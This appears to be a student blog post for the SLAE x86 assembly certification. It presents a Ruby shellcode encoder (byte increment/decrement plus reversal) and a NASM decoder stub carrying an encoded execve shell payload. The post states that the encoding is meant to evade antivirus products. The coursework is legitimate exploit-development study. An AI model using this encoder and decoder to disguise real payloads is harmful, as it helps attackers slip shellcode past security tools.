---
title: "SLAE x86 - Assignment 0x4"
date: 2021-10-22T09:14:40Z
draft: false
tags:
  - exploit_dev
  - assembly
categories:
  - certification
keywords:
  - slae
  - shellcode
  - assembly
---

# Custom Shellcode Encoder
## Objectives
- Create a custom encoding scheme
- PoC using execve-stack as the shellcode to encode with the schema and execute

## Overview
Shellcode encoding is used to make a shellcode looks gibberish or mask the original functionality. One use-case is evading antivirus or related products. During the execution of the shellcode, the first part of it will decode the encoded part of the main shellcode then execute once done.

## Schema
The schema utilized for this assignment is plain and simple, but a good exercise to implement the decoder in the nasm code. Below are the steps done:
- iterate throught the shellcode bytes and check:
  - if even, add 1
  - if not, subtract 1
- once done with all the shellcode bytes, it will reverse the arrangement
  - first byte will be the last, the last byte will be the first, and so on.

The following Ruby script do this implementation, as well as compile the nasm code which has the decoder(this will be discussed in the next section):
```ruby
#!/usr/bin/env ruby
# Author: Jason Villaluna

require 'optparse'

def run
  parse_args
  compile_nasm(@filename)
  @shellcode = generate_shellcode(@filename)
  encode
  replace_encoded_shellcode
  compile_nasm
  @new_shellcode = generate_shellcode
  replace_shellcode
  compile_binary
  display_shellcode
rescue OptionParser::MissingArgument
  puts "\e[33mMissing argument:\e[0m"
  @parser.parse %w[--help]
rescue StandardError => e
  puts "\e[31m[-]\e[0m Encountered: \e[31m'#{e.class}' #{e}\e[0m"
  exit(1)
end

# Compile the nasm code
def compile_nasm(filename = 'decoder')
  `nasm -f elf32 -o #{filename}.o #{filename}.nasm`
  `ld -m elf_i386 -s -o #{filename} #{filename}.o`
end

# Generate shellcode using objdump
def generate_shellcode(filename = 'decoder')
  objdump = `objdump -d #{filename}`
  objdump.split("\n").map { |line| line.split("\t")[1] }
         .compact.map(&:split).join('\x').prepend('\x')
end

# Encode the shellcode
def encode
  # Will add 1 if the input is even and subtract 1 if odd
  # and then reverse the arrangement of the bytes
  encoded = @shellcode.split('\\x').map do |input|
    input_ = input.to_i(16)
    input_.even? ? input_ + 1 : input_ - 1
  end[1..-1].reverse
  @length = encoded.size

  # Format for the message in #display_shellcode
  @encoded =  encoded.map { |number| number.to_s(16) }.join('\x').prepend('\x')

  # Format needed for that nasm code
  @encoded_shellcode = @encoded.gsub('\\', ',0')[1..-1]
end

# Replace a value inside a file
def replace_content(filename)
  file_content = File.read(filename)
  yield(file_content)
  File.write(filename, file_content)
end

# Replace shellcode in the shellcode tester program
def replace_encoded_shellcode
  replace_content('./decoder.nasm') do |nasm_code|
    nasm_code.gsub!(/LENGTH equ .*$/, "LENGTH equ #{@length}")
    nasm_code.gsub!(/code: db .*$/, "code: db #{@encoded_shellcode}")
  end
end

# Replace shellcode in the shellcode tester program
def replace_shellcode
  replace_content('./shellcode.c') do |c_code|
    c_code.gsub!(/\"\S+\"\;/, "\"#{@new_shellcode}\"\;")
  end
end

# Compile the shellcode into binary with the help of the shellcode.c program
def compile_binary
  `gcc -fno-stack-protector -m32 -z execstack shellcode.c -o shellcode 2> /dev/null`
end

# print the shellcode values
def display_shellcode
  puts "Input shellcode:   '#{@shellcode}'"
  puts "Encoded shellcode: '#{@encoded}'"
  puts "Final shellcode:   '#{@new_shellcode}'"
end

def parse_args
  @parser = OptionParser.new do |opts|
    opts.banner = "Usage: #{$0} [options]"
    opts.separator ""
    opts.separator "Options:"

    opts.on("--nasm", "-n FILENAME", "Nasm file to be encoded.") do |value|
      @filename = value
    end

    opts.on_tail("--help", "-h", "Print options") do |show_help|
      warn opts
      exit(0)
    end
  end
  @parser.parse!
end

if __FILE__ == $PROGRAM_NAME
  run
  puts "\n\e[32m[+]\e[0m Successfully generated \e[32mshellcode\e[0m "\
       "binary for testing!"
end
```

## Decoder
The decoder will simply reverse the operations done by the [encoder](#schema). This will comprise of the following steps:
- reverse the arrangement of the shellcode bytes
- iterate through the shellcode bytes and check:
  - if odd, subtract 1
  - if not, add 1

Below is the nasm code implementation of the decoder with inline comments for further explanation:
```nasm
; Purpose: decode an encoded(see compiler.rb) shellcode
global _start

section .text
  LENGTH equ 25

_start:
  jmp short call_shellcode    ; jump to call_shellcode

decoder:
  pop esi                      ; esi = address of the Shellcode
  xor ecx, ecx                 ; clear ecx
  xor ebx, ebx                 ; clear ebx
  mul ecx                      ; clear eax and edx
  mov cl, LENGTH - 1           ; cl = length - 1 for loop (reverse)

reverse:                       ; reverse the arrangement of the Shellcode bytes
  xchg al, byte [esi + edx]    ; al = value of the shellcode using edx as index
  xchg bl, byte [esi + ecx]    ; bl = value of the shellcode using ecx as index
  xchg bl, al                  ; exchange the values of al and bl
  xchg al, byte [esi + edx]    ; move the value of ecx index into edx index
  xchg bl, byte [esi + ecx]    ; move the value of edx index into ecx index
  inc edx                      ; edx + 1 to move in index index
  dec ecx                      ; ecx - 1 to move in previous index
  cmp dl, LENGTH/2             ; stop the loop if the first and second half of shellcode already interchanged
  jnz reverse                  ; if not, continue the loop(reverse)

decode:                        ; subtract 1 for even and add 1 for odd
  mov al, byte [esi + ebx]     ; run through every byte of the Shellcode
  test al, 1                   ; check if current byte is an odd. Source: https://www.felixcloutier.com/x86/test and https://stackoverflow.com/questions/49116747/assembly-check-if-number-is-even/49116885
  jnz subtract                 ; if odd, subtract 1
  inc al                       ; if even, add 1

decode_:
  mov byte [esi + ebx], al     ; move new value into the current Shellcode byte
  inc ebx                      ; decode the next byte
  cmp ebx, LENGTH              ; stop the loop if all bytes are decoded
  jnz decode                   ; otherwise, continue the loop(decode)
  jz short Shellcode           ; jump to the Shellcode once it is decoded

subtract:                      ; subtract 1
  dec al
  jmp short decode_

call_shellcode:
  call decoder                 ; jump to decoder and push the Shellcode into the stack
  Shellcode: db 0x81,0xcc,0xa,0xb1,0xe0,0x88,0x52,0xe3,0x88,0x51,0xe2,0x88,0x6f,0x68,0x63,0x2e,0x69,0x69,0x72,0x2e,0x2e,0x69,0x51,0xc1,0x30
```

## Script usage and testing
![](encoder_decoder.gif)

---
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE - 1558

---
[`Link to Github repository`](https://github.com/jsnv-dev/slae_x86_assignments/tree/main/A4) | [`Link to index page`](../slae_x86)
